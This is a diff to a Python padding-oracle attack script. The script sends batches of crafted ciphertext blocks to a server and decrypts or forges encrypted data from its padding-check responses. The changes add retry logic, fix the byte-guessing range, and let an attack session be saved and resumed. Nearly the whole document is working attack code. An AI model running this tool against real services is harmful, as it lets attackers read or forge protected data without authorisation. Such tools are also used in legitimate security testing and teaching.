@@ -1,10 +1,10 @@
-import asyncio
 from Crypto.Util.Padding import pad
 import time
+from grequests import request
 import grequests
-from requests import request
 from requests import Response, Request, get
-import os, sys
+import os, sys, abc
+import json
 
 class payload_model(object):
     """
@@ -54,7 +54,7 @@ class payload_model(object):
             self.decrypt_block[0] = self.data_block[0]
 
         self.encrypt_block = [b""] * (self.block_len + 1)
-        self.encrypt_block[-1] = b"\x00" * 16
+        self.encrypt_block[-1] = b"\xaa" * 16
 
 
         self.block = self.block_len - 1
@@ -67,7 +67,7 @@ class payload_model(object):
     def pre_handle(self, data) -> bytes:
         return bytes.fromhex(data)
 
-    def padding_ok(self, resp:Response):
+    def padding_ok(self, resp:Response) -> bool:
         """judge if resp is successful\n
         :param resp: the response of resquest\n
         :rtype: boolean
@@ -98,11 +98,11 @@ class payload_model(object):
     def attack(self, fake_datas):
         fake_data = None
 
-        resps = []
+        reqs = []
         for data in fake_datas:
-            resps.append(self.make_request(data))
+            reqs.append(self.make_request(data))
 
-        for resp in grequests.map(resps):
+        for resp in grequests.map(reqs):
             if self.padding_ok(resp):
                 fake_data = self.recover_fake_data(resp.request, fake_datas)
                 break
@@ -135,42 +135,61 @@ class payload_model(object):
         print("\033[s" + new_data)
         sys.stdout.flush()
             
+        error_times = 0
         while (self.block >= 0 and self.fake) or (self.block >= 1 and not self.fake):
-            # print(self.decrypt_block)
-            sure_data = b""
+            try:
+                # print(self.decrypt_block)
+                sure_data = b""
 
-            if 16 - self.byte - 1 != 0:
-                sure_data =  self.xor(int.to_bytes(16 - self.byte, byteorder="little", length=1) * (16 - self.byte - 1), self.decrypt_block[self.block])
+                if 16 - self.byte - 1 != 0:
+                    sure_data =  self.xor(int.to_bytes(16 - self.byte, byteorder="little", length=1) * (16 - self.byte - 1), self.decrypt_block[self.block])
 
-            fake_data = b"\x00" * (self.byte+1) + sure_data
+                fake_data = b"\x00" * (self.byte+1) + sure_data
 
-            fake_datas = []
-            for i in range(255):
-                new_fake_data = fake_data[:self.byte] + int.to_bytes(i, byteorder="little", length=1) + fake_data[self.byte+1:]
+                fake_datas = []
+                for i in range(256):
+                    new_fake_data = fake_data[:self.byte] + int.to_bytes(i, byteorder="little", length=1) + fake_data[self.byte+1:]
+                    if self.fake:
+                        fake_datas.append(new_fake_data + self.encrypt_block[self.block + 1])
+                    else:
+                        fake_datas.append(new_fake_data + self.data_block[self.block])
+
+                #handle situation when retry too many times
+                if not self.attack(fake_datas):
+                    if error_times < 10:
+                        print("retry %d times..." % error_times, end="\r")
+                        error_times += 1
+                    else:
+                        error_times = 0
+                        self.decrypt_block[self.block] = b""
+                        self.encrypt_block[self.block] = b""
+                        self.byte = 15
+                    continue
+
+                
                 if self.fake:
-                    fake_datas.append(new_fake_data + self.encrypt_block[self.block + 1])
+                    new_data = self.print_hex((b"".join([b"\x00" * 16] * self.block) + b"\x00" * (16 - len(self.encrypt_block[self.block]))))
+                    new_data += self.print_hex(self.encrypt_block[self.block], color=True)
                 else:
-                    fake_datas.append(new_fake_data + self.data_block[self.block])
+                    new_data = self.print_hex(b"\x00" * (16 - len(self.decrypt_block[self.block]) + 16 * (self.block - 1))) + \
+                        self.print_hex(self.decrypt_block[self.block], color=True)
+                        
+                sys.stdout.write("\033[u" + new_data)
+                sys.stdout.flush()
 
-            if not self.attack(fake_datas):
-                continue
+                if self.byte == 0:
+                    self.block -= 1
+                    self.byte = 15
+                else:
+                    self.byte -= 1
 
-            
-            if self.fake:
-                new_data = self.print_hex((b"".join([b"\x00" * 16] * self.block) + b"\x00" * (16 - len(self.encrypt_block[self.block]))))
-                new_data += self.print_hex(self.encrypt_block[self.block], color=True)
-            else:
-                new_data = self.print_hex(b"\x00" * (16 - len(self.decrypt_block[self.block]) + 16 * (self.block - 1))) + \
-                    self.print_hex(self.decrypt_block[self.block], color=True)
-                    
-            sys.stdout.write("\033[u" + new_data)
-            sys.stdout.flush()
-
-            if self.byte == 0:
-                self.block -= 1
-                self.byte = 15
-            else:
-                self.byte -= 1
+            #when you stop attack, it save session to file padding-session.txt and print session.
+            except KeyboardInterrupt:
+                dump = self.dump()
+                print(dump)
+                with open("padding-session.txt", "w") as f:
+                    f.write(dump)
+                os._exit(-1)
 
         if self.fake:
             data = b"".join(self.encrypt_block)
@@ -185,7 +204,33 @@ class payload_model(object):
         resp = grequests.map([self.make_request(data)])[0]
         print("content: " + resp.text)
             
+    def dump(self) -> str:
+        return json.dumps(
+            {
+            "data": bytes.hex(self.data),
+            "fake": self.fake,
+            "block_len": self.block_len,
+            "data_block": [bytes.hex(x) for x in self.data_block],
+            "decrypt_block": [bytes.hex(x) for x in self.decrypt_block],
+            "encrypt_block": [bytes.hex(x) for x in self.encrypt_block],
+            "block": self.block,
+            "byte": self.byte 
+            })
+    
+    def load(self):
+        data = ""
+        with open("padding-session.txt") as f:
+            data = json.loads(f.read())
+        self.data = bytes.fromhex(data["data"])
+        self.fake = data["fake"] 
+        self.block_len = data["block_len"]
+        self.data_block = [bytes.fromhex(x) for x in data["data_block"]]
+        self.decrypt_block = [bytes.fromhex(x) for x in data["decrypt_block"]]
+        self.encrypt_block = [bytes.fromhex(x) for x in data["encrypt_block"]]
+        self.block = data["block"]
+        self.byte = data["byte"]
+
 
 if __name__ == "__main__":
-    model = payload_model("3a10f84900818b1c439430600524fb0f" * 10, fake=True)
+    model = payload_model("3a10f84900818b1c439430600524fb0f" * 100, fake=True)
     model.run()
